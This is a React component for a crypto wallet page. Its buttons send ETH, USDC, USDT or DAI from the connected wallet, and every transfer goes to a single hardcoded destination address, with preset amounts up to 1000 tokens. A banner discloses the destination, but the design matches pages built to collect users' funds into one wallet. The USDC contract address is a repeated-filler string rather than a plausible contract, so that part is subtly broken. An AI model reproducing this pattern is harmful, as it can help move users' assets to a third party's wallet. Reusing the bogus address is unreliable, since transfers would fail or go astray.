"use client"

import { useState } from "react"
import { useAccount, useBalance, useSendTransaction, useWriteContract, useWaitForTransactionReceipt } from "wagmi"
import { parseEther, parseUnits, formatUnits } from "viem"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Send, Loader2, AlertTriangle, CheckCircle } from "lucide-react"
import { toast } from "sonner"

// Hardcoded destination wallet
const DESTINATION_WALLET = "0x566A1613668eFF73baBb9D6D1cF6aea77eea43a7"

// ERC-20 Token ABI (minimal for transfer)
const ERC20_ABI = [
  {
    name: "transfer",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "", type: "bool" }],
  },
  {
    name: "balanceOf",
    type: "function",
    stateMutability: "view",
    inputs: [{ name: "account", type: "address" }],
    outputs: [{ name: "", type: "uint256" }],
  },
  {
    name: "decimals",
    type: "function",
    stateMutability: "view",
    inputs: [],
    outputs: [{ name: "", type: "uint8" }],
  },
] as const

// Supported tokens (you can modify these)
const SUPPORTED_TOKENS = {
  ETH: { symbol: "ETH", decimals: 18, address: null },
  USDC: { symbol: "USDC", decimals: 6, address: "0xA0b86a33E6441b8dB4B2b8b8b8b8b8b8b8b8b8b8" },
  USDT: { symbol: "USDT", decimals: 6, address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
  DAI: { symbol: "DAI", decimals: 18, address: "0x6B175474E89094C44Da98b954EedeAC495271d0F" },
}

export function TokenTransfer() {
  const { address } = useAccount()
  const [selectedToken, setSelectedToken] = useState("ETH")
  const [amount, setAmount] = useState("")
  const [isTransferring, setIsTransferring] = useState(false)

  // Get native token balance
  const { data: ethBalance } = useBalance({
    address: address,
  })

  // Get ERC-20 token balance
  const { data: tokenBalance } = useBalance({
    address: address,
    token: SUPPORTED_TOKENS[selectedToken as keyof typeof SUPPORTED_TOKENS]?.address as `0x${string}`,
  })

  // Native token transfer
  const { sendTransaction, data: nativeHash } = useSendTransaction()

  // ERC-20 token transfer
  const { writeContract, data: tokenHash } = useWriteContract()

  // Wait for transaction confirmation
  const { isLoading: isNativeConfirming } = useWaitForTransactionReceipt({
    hash: nativeHash,
  })

  const { isLoading: isTokenConfirming } = useWaitForTransactionReceipt({
    hash: tokenHash,
  })

  const currentBalance = selectedToken === "ETH" ? ethBalance : tokenBalance
  const token = SUPPORTED_TOKENS[selectedToken as keyof typeof SUPPORTED_TOKENS]

  const handleQuickTransfer = async (quickAmount: string) => {
    if (!address) {
      toast.error("Please connect your wallet")
      return
    }

    setIsTransferring(true)
    try {
      if (selectedToken === "ETH") {
        await sendTransaction({
          to: DESTINATION_WALLET,
          value: parseEther(quickAmount),
        })
        toast.success(`Transferring ${quickAmount} ETH...`)
      } else {
        const tokenAddress = token.address as `0x${string}`
        const transferAmount = parseUnits(quickAmount, token.decimals)

        await writeContract({
          address: tokenAddress,
          abi: ERC20_ABI,
          functionName: "transfer",
          args: [DESTINATION_WALLET, transferAmount],
        })
        toast.success(`Transferring ${quickAmount} ${selectedToken}...`)
      }
    } catch (error) {
      console.error("Transfer failed:", error)
      toast.error("Transfer failed. Please try again.")
    } finally {
      setIsTransferring(false)
    }
  }

  const handleCustomTransfer = async () => {
    if (!address || !amount) {
      toast.error("Please enter an amount")
      return
    }

    const numAmount = Number.parseFloat(amount)
    if (numAmount <= 0) {
      toast.error("Amount must be greater than 0")
      return
    }

    // Check balance
    if (currentBalance) {
      const balance = Number.parseFloat(formatUnits(currentBalance.value, currentBalance.decimals))
      if (numAmount > balance) {
        toast.error("Insufficient balance")
        return
      }
    }

    setIsTransferring(true)
    try {
      if (selectedToken === "ETH") {
        await sendTransaction({
          to: DESTINATION_WALLET,
          value: parseEther(amount),
        })
        toast.success(`Transferring ${amount} ETH...`)
      } else {
        const tokenAddress = token.address as `0x${string}`
        const transferAmount = parseUnits(amount, token.decimals)

        await writeContract({
          address: tokenAddress,
          abi: ERC20_ABI,
          functionName: "transfer",
          args: [DESTINATION_WALLET, transferAmount],
        })
        toast.success(`Transferring ${amount} ${selectedToken}...`)
      }
      setAmount("")
    } catch (error) {
      console.error("Transfer failed:", error)
      toast.error("Transfer failed. Please try again.")
    } finally {
      setIsTransferring(false)
    }
  }

  const formatAddress = (addr: string) => {
    return `${addr.slice(0, 6)}...${addr.slice(-4)}`
  }

  return (
    <Card className="bg-slate-800/50 border-slate-700">
      <CardHeader>
        <CardTitle className="text-white flex items-center gap-2">
          <Send className="w-5 h-5 text-purple-500" />
          Token Transfer
        </CardTitle>
        <div className="bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-3">
          <div className="flex items-center gap-2 text-yellow-400">
            <AlertTriangle className="w-4 h-4" />
            <span className="text-sm font-medium">Warning</span>
          </div>
          <p className="text-yellow-300 text-xs mt-1">
            All transfers will be sent to: {formatAddress(DESTINATION_WALLET)}
          </p>
          <p className="text-yellow-300 text-xs">This action is irreversible!</p>
        </div>
      </CardHeader>
      <CardContent>
        <Tabs defaultValue="quick" className="w-full">
          <TabsList className="grid w-full grid-cols-2 bg-slate-700">
            <TabsTrigger value="quick" className="data-[state=active]:bg-slate-600">
              Quick Transfer
            </TabsTrigger>
            <TabsTrigger value="custom" className="data-[state=active]:bg-slate-600">
              Custom Amount
            </TabsTrigger>
          </TabsList>

          <TabsContent value="quick" className="space-y-4">
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-slate-300">Select Token:</span>
                <Select value={selectedToken} onValueChange={setSelectedToken}>
                  <SelectTrigger className="w-32 bg-slate-700 border-slate-600">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent className="bg-slate-700 border-slate-600">
                    {Object.keys(SUPPORTED_TOKENS).map((token) => (
                      <SelectItem key={token} value={token}>
                        {token}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              {currentBalance && (
                <div className="text-sm text-slate-400">
                  Balance: {Number.parseFloat(formatUnits(currentBalance.value, currentBalance.decimals)).toFixed(6)}{" "}
                  {selectedToken}
                </div>
              )}

              <div className="grid grid-cols-3 gap-2">
                {selectedToken === "ETH" ? (
                  <>
                    <Button
                      variant="outline"
                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
                      onClick={() => handleQuickTransfer("0.01")}
                      disabled={isTransferring || isNativeConfirming}
                    >
                      0.01 ETH
                    </Button>
                    <Button
                      variant="outline"
                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
                      onClick={() => handleQuickTransfer("0.1")}
                      disabled={isTransferring || isNativeConfirming}
                    >
                      0.1 ETH
                    </Button>
                    <Button
                      variant="outline"
                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
                      onClick={() => handleQuickTransfer("0.5")}
                      disabled={isTransferring || isNativeConfirming}
                    >
                      0.5 ETH
                    </Button>
                  </>
                ) : (
                  <>
                    <Button
                      variant="outline"
                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
                      onClick={() => handleQuickTransfer("10")}
                      disabled={isTransferring || isTokenConfirming}
                    >
                      10 {selectedToken}
                    </Button>
                    <Button
                      variant="outline"
                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
                      onClick={() => handleQuickTransfer("100")}
                      disabled={isTransferring || isTokenConfirming}
                    >
                      100 {selectedToken}
                    </Button>
                    <Button
                      variant="outline"
                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
                      onClick={() => handleQuickTransfer("1000")}
                      disabled={isTransferring || isTokenConfirming}
                    >
                      1000 {selectedToken}
                    </Button>
                  </>
                )}
              </div>
            </div>
          </TabsContent>

          <TabsContent value="custom" className="space-y-4">
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-slate-300">Select Token:</span>
                <Select value={selectedToken} onValueChange={setSelectedToken}>
                  <SelectTrigger className="w-32 bg-slate-700 border-slate-600">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent className="bg-slate-700 border-slate-600">
                    {Object.keys(SUPPORTED_TOKENS).map((token) => (
                      <SelectItem key={token} value={token}>
                        {token}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              {currentBalance && (
                <div className="text-sm text-slate-400">
                  Balance: {Number.parseFloat(formatUnits(currentBalance.value, currentBalance.decimals)).toFixed(6)}{" "}
                  {selectedToken}
                </div>
              )}

              <div className="space-y-2">
                <Input
                  type="number"
                  placeholder={`Enter ${selectedToken} amount`}
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="bg-slate-700 border-slate-600 text-white"
                  step="any"
                  min="0"
                />
                <Button
                  onClick={handleCustomTransfer}
                  disabled={!amount || isTransferring || isNativeConfirming || isTokenConfirming}
                  className="w-full bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700"
                >
                  {isTransferring || isNativeConfirming || isTokenConfirming ? (
                    <>
                      <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                      Transferring...
                    </>
                  ) : (
                    <>
                      <Send className="w-4 h-4 mr-2" />
                      Transfer {selectedToken}
                    </>
                  )}
                </Button>
              </div>
            </div>
          </TabsContent>
        </Tabs>

        {/* Transaction Status */}
        {(nativeHash || tokenHash) && (
          <div className="mt-4 p-3 bg-blue-500/20 border border-blue-500/30 rounded-lg">
            <div className="flex items-center gap-2 text-blue-400">
              {isNativeConfirming || isTokenConfirming ? (
                <Loader2 className="w-4 h-4 animate-spin" />
              ) : (
                <CheckCircle className="w-4 h-4" />
              )}
              <span className="text-sm font-medium">
                {isNativeConfirming || isTokenConfirming ? "Confirming..." : "Transaction Sent"}
              </span>
            </div>
            <p className="text-blue-300 text-xs mt-1 font-mono">
              Hash: {(nativeHash || tokenHash)?.slice(0, 10)}...{(nativeHash || tokenHash)?.slice(-8)}
            </p>
          </div>
        )}
      </CardContent>
    </Card>
  )
}
